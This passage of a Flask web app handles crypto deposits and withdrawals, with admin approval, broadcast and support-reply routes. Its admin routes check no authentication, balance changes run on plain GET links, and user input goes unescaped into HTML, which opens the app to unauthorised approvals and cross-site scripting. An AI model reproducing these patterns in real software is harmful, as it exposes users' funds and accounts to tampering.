    return f"""{ui()}<div class="max-w-md mx-auto p-4"><h2 class="text-blue-400 text-center text-3xl mb-6">👥 All User Information</h2><div class="space-y-4">{user_html or '<div class="glass p-8 text-center text-gray-400">No registered users yet</div>'}</div><a href="/admin?id={ADMIN_ID}" class="btn bg-gray-500 text-white mt-6">← Back to Admin Panel</a></div>"""

# ====================== DEPOSIT ======================
@app.route("/deposit")
def deposit():
    uid = request.args.get("id")
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><div class="glass p-8"><form action='/dep2'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Amount' class='text-black w-full p-3 rounded mb-3'><select name='network' class='text-black w-full p-3 rounded mb-3'><option>TRC20</option><option>ERC20</option></select><button class='btn bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue'>Next</button></form></div></div>"""

@app.route("/dep2")
def dep2():
    uid = request.args.get("uid")
    net = request.args.get("network")
    amount = request.args.get("amount")
    addr = TRC if net == "TRC20" else ERC
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><div class="glass p-8">Send {amount} to:<br><span class="text-emerald-400 break-all">{addr}</span><form action='/dep3'><input type='hidden' name='uid' value='{uid}'><input type='hidden' name='amount' value='{amount}'><input type='hidden' name='network' value='{net}'><input name='txid' placeholder='TXID' class='text-black w-full p-3 rounded mt-4'><button class='btn bg-gradient-to-r from-blue-500 to-purple-500 text-white neon-blue'>Submit</button></form></div></div>"""

@app.route("/dep3")
def dep3():
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO deposits VALUES(NULL,?,?,?,?,?,?)", (request.args.get("uid"), float(request.args.get("amount")), request.args.get("network"), request.args.get("txid"), "pending", ""))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Deposit Request Submitted</h2><a href="/?id={request.args.get('uid')}" class="btn bg-green-500 text-white">Back to Home</a></div></div>"""

# ====================== WITHDRAW ======================
@app.route("/withdraw")
def withdraw():
    uid = request.args.get("id")
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><div class="glass p-8"><form action='/w2'><input type='hidden' name='uid' value='{uid}'><input name='amount' placeholder='Amount' class='text-black w-full p-3 rounded mb-3'><input name='address' placeholder='Wallet Address' class='text-black w-full p-3 rounded mb-3'><select name='network' class='text-black w-full p-3 rounded mb-3'><option>TRC20</option><option>ERC20</option></select><button class='btn bg-gradient-to-r from-red-500 to-rose-600 text-white'>Submit</button></form></div></div>"""

@app.route("/w2")
def w2():
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO withdraws VALUES(NULL,?,?,?,?,?,?)", (request.args.get("uid"), float(request.args.get("amount")), request.args.get("address"), request.args.get("network"), "pending", ""))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Withdraw Request Submitted</h2><a href="/?id={request.args.get('uid')}" class="btn bg-green-500 text-white">Back to Home</a></div></div>"""

# ====================== DEPOSITS & WITHDRAWS ADMIN ======================
@app.route("/deposits")
def deposits():
    conn = db()
    c = conn.cursor()
    c.execute("SELECT id, user_id, amount, network, txid FROM deposits WHERE status='pending'")
    data = c.fetchall()
    conn.close()
    items = "".join([f"""<div class="glass p-5"><p><strong>User:</strong> {d['user_id']}</p><p><strong>Amount:</strong> {d['amount']} USD</p><p><strong>Network:</strong> {d['network']}</p><p><strong>TXID:</strong> {d['txid']}</p><div class="flex gap-3 mt-5"><a href='/approve_dep?id={d['id']}' class='btn bg-green-500 flex-1'>Approve</a><form action='/reject_dep' class="flex-1"><input type='hidden' name='id' value='{d['id']}'><input name='reason' placeholder="Reason" class='text-black w-full p-3 rounded mb-3'><button class='btn bg-red-500 w-full'>Reject</button></form></div></div>""" for d in data])
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><h2 class="text-blue-400 text-center text-xl mb-4">Pending Deposits</h2>{items or '<div class="glass p-8 text-center text-gray-400">No pending deposits</div>'}<a href='/admin?id={ADMIN_ID}' class="btn bg-gray-500 text-white mt-6">← Back to Admin</a></div>"""

@app.route("/withdraws")
def withdraws():
    conn = db()
    c = conn.cursor()
    c.execute("SELECT id, user_id, amount, address, network FROM withdraws WHERE status='pending'")
    data = c.fetchall()
    conn.close()
    items = "".join([f"""<div class="glass p-5"><p><strong>User:</strong> {d['user_id']}</p><p><strong>Amount:</strong> {d['amount']} USD</p><p><strong>Address:</strong> {d['address']}</p><p><strong>Network:</strong> {d['network']}</p><div class="flex gap-3 mt-5"><a href='/approve_w?id={d['id']}' class='btn bg-green-500 flex-1'>Approve</a><form action='/reject_w' class="flex-1"><input type='hidden' name='id' value='{d['id']}'><input name='reason' placeholder="Reason" class='text-black w-full p-3 rounded mb-3'><button class='btn bg-red-500 w-full'>Reject</button></form></div></div>""" for d in data])
    return f"""{ui()}<div class="max-w-md mx-auto p-4"><h2 class="text-blue-400 text-center text-xl mb-4">Pending Withdraws</h2>{items or '<div class="glass p-8 text-center text-gray-400">No pending withdraws</div>'}<a href='/admin?id={ADMIN_ID}' class="btn bg-gray-500 text-white mt-6">← Back to Admin</a></div>"""

@app.route("/approve_dep")
def approve_dep():
    id_ = request.args.get("id")
    conn = db()
    c = conn.cursor()
    c.execute("SELECT user_id, amount FROM deposits WHERE id=?", (id_,))
    d = c.fetchone()
    c.execute("UPDATE users SET balance=balance+? WHERE id=?", (d['amount'], d['user_id']))
    c.execute("UPDATE deposits SET status='approved' WHERE id=?", (id_,))
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (d['user_id'], f"Deposit Approved {d['amount']} USD"))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Deposit Approved</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/reject_dep")
def reject_dep():
    id_ = request.args.get("id")
    reason = request.args.get("reason") or "No reason given"
    conn = db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM deposits WHERE id=?", (id_,))
    uid = c.fetchone()['user_id']
    c.execute("UPDATE deposits SET status='rejected', reason=? WHERE id=?", (reason, id_))
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, f"Deposit Rejected: {reason}"))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">❌ Deposit Rejected</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/approve_w")
def approve_w():
    id_ = request.args.get("id")
    conn = db()
    c = conn.cursor()
    c.execute("SELECT user_id, amount FROM withdraws WHERE id=?", (id_,))
    w = c.fetchone()
    c.execute("UPDATE users SET balance=balance-? WHERE id=?", (w['amount'], w['user_id']))
    c.execute("UPDATE withdraws SET status='approved' WHERE id=?", (id_,))
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (w['user_id'], f"Withdraw Approved {w['amount']} USD"))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Withdraw Approved</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/reject_w")
def reject_w():
    id_ = request.args.get("id")
    reason = request.args.get("reason") or "No reason given"
    conn = db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM withdraws WHERE id=?", (id_,))
    uid = c.fetchone()['user_id']
    c.execute("UPDATE withdraws SET status='rejected', reason=? WHERE id=?", (reason, id_))
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, f"Withdraw Rejected: {reason}"))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">❌ Withdraw Rejected</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/broadcast")
def broadcast():
    conn = db()
    c = conn.cursor()
    c.execute("SELECT id FROM users")
    for u in c.fetchall():
        c.execute("INSERT INTO messages VALUES(NULL,?,?)", (u['id'], request.args.get("m")))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Broadcast Sent</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

@app.route("/reply_support")
def reply_support():
    uid = request.args.get("uid")
    reply = request.args.get("reply")
    conn = db()
    c = conn.cursor()
    c.execute("INSERT INTO messages VALUES(NULL,?,?)", (uid, f"Admin: {reply}"))
    conn.commit()
    conn.close()
    return f"""{ui()}<div class="max-w-md mx-auto p-5 min-h-screen flex items-center justify-center text-center"><div class="glass"><h2 class="text-green-400 text-3xl mb-4">✅ Reply Sent</h2><a href="/admin?id={ADMIN_ID}" class="btn bg-green-500 text-white">Back to Admin</a></div></div>"""

# ====================== RUN ======================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
